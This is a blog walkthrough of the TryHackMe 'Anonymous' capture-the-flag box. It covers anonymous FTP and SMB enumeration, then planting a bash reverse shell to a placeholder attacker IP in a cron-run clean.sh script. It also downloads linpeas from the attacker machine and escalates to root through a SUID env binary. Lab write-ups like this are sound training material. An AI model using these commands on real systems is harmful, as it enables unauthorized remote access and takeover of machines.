---
layout: post
title: " Anonymous - TryHackMe"
date: 2020-07-13
ctf: true
excerpt: "Walkthrough for Anonymous on TryHackme"
tags: [Anonymous, TryHackMe, privilege escalation, script modification]
comments: false
---

Anonymous is a medium difficulty box on [TryHackMe](https://www.tryhackme.com). Below is a walkthrough of the steps involved to achieve root on this box.

First, let's scan the box with nmap with **nmap -sC -sV -T4 [machine ip]**. The results of this scan are as shown below.

![Anonymous nmap](/assets/img/Anonymous1.png)

It appears that we have ftp (21) open with anonymous access allowed, ssh (22), and smb (139/445) open. 

This are a total of 4 open ports, the answer to **Question 1**. FTP is running on port 21, the answer to **Question 2**. Ports 139/445 are running smb, the answer to **Question 3**. 

Since we can see that ftp is open anonymously, let's login and take a look with **ftp [machine ip]**. When prompted for the username/password, use **anonymous** for both of them. Once logged in, we can run **ls** to list the directory contents.

![Anonymous ftp connect](/assets/img/Anonymous2.png)

Let's use **cd scripts** to get into the script directory and then type **ls** to list it's contents. Three files are present. Let's run **mget \*** to download these files to view them locally.

![Anonymous ftp scripts directory](/assets/img/Anonymous3.png)

Let's use **bye** to close the ftp session and then take a look at these files. Let's start with **cat clean.sh**. This appears to be a script that removes everything in the /tmp directory and then logs it to **/var/ftp/scripts/removed_files.log**.

![Anonymous cat clean.sh](/assets/img/Anonymous4.png)

Next, let's take a look at removed_files.log with **cat removed_files.log**. It doesn't appear that there's anything useful in this, as it is the same log entry repeated several times.

![Anonymous cat removed_files.log](/assets/img/Anonymous5.png)

The last file, which is viewed with **cat to_do.txt**, states that anonymous logins should be disabled because they aren't safe.

![Anonymous cat to_do.txt](/assets/img/Anonymous6.png)

This is likely a hint that anonymous access is available in multiple places. Let's try to enumerate the smb shares next with **smbclient -L \\\\\\\\[machine ip]\\\\**. This will return 3 shares as shown above.

![Anonymous list smb shares smbclient](/assets/img/Anonymous7.png)

The smb share **pics** is the answer to **Question 4**. Let's try to connect to pics anonymously with **smbclient \\\\\\\\[machine ip]\\\\pics -U ""**. We are also able to connect anonymously and after running **ls**, we see that there are 2 pictures in this folder. Let's grab them both with **mget \***.

![Anonymous smbclient anonymous](/assets/img/Anonymous8.png)

Let's take a look at these two pictures. There's nothing suspicious on the pictures themselves, as they are just pictures of corgis. However, .jpg/.jpeg files can be used for steganography. Let's see if there's any hidden files inside. I ran stegcracker for a few minutes on both of these pictures and was not able to crack the password or confirm anything was hidden inside.

Let's go back to enumeration using rpcclient. Let's run **rpcclient [machine ip] -U ""**. Once connected, let's run **enumdomusers** to get the users on this victim host (namelessone) followed by **queryuser 0x3eb** and **getdompwinfo**.

![Anonymous rpcclient](/assets/img/Anonymous9.png)

While useful info, unless we wanted to spend a long time brute forcing the password, there had to be a simpler way to get in. At this point, I logged back in anonymously to the ftp server and noticed that we have read/write/execute on **clean.sh**. I wonder what would happen if we put in a reverse shell to run inside that script? On our local machine, let's open the **clean.sh** file that we downloaded earlier and modify it before we reupload it. Let's add in **bash -i >& /dev/tcp/[your attacker ip]/8080 0>&1** and save the file.

![Anonymous modify clean.sh](/assets/img/Anonymous10.png)

Next, in another terminal window on our attacker pc, run **nc -nvlp 8080** to open a listener on port 8080 that you specified in the clean.sh file above.

![Anonymous nc listener](/assets/img/Anonymous11.png)

Next, let's reconnect with the anonymous ftp site, go into the scripts directory and upload our modified clean.sh file.

![Anonymous clean.sh upload](/assets/img/Anonymous12.png)

Now, we just wait for a connection, as that script appeared to be ran as a cron job. Within a couple of minutes, we now have a shell.

![Anonymous reverse shell](/assets/img/Anonymous13.png)

We are running as namelessone, and after running **pwd** we can see we are in that user's home directory. We can run **ls** and we will see the user.txt file in this directory. **cat user.txt** will get you the answer to **Question 5**.

![Anonymous user.txt](/assets/img/Anonymous14.png)

Let's upgrade our shell so we can run some other commands that require a TTY. Let's upgrade with **python -c 'import pty; pty.spawn("/bin/sh")'**. Attempting to run **sudo -l** requires a password, which we do not have for the user we currently have access to. Let's copy linpeas over to do some enumeration.

First, on our attacker pc, run **python3 -m http.server** in the directory that linepeas.sh is in. Next, on the victim, run **wget http://[attacker ip]:8000/linpeas.sh**, and it should save in namelessone's home directory. Next, run **chmod 777 linpeas.sh** to make the script executable.

![Anonymous wget linpeas.sh](/assets/img/Anonymous15.png)

Now lets run this with **./linpeas.sh**. While this puts out a lot of information, there is a SUID file that it notices, **/usr/bin/env**.

![Anonymous SUID](/assets/img/Anonymous16.png)

[GTFOBins](https://gtfobins.github.io/) is a great site to look up ways to exploit executables in Linux. env can be used for privilege escalation with **./env /bin/sh -p**. Now, if we run **whoami** we are the root user! We can now run **cd /root** followed by **ls**. root.txt is in this file, so let's run **cat root.txt** to get the root flag. This is the final challenge and the answer to **Question 6**.

![Anonymous root.txt](/assets/img/Anonymous17.png)
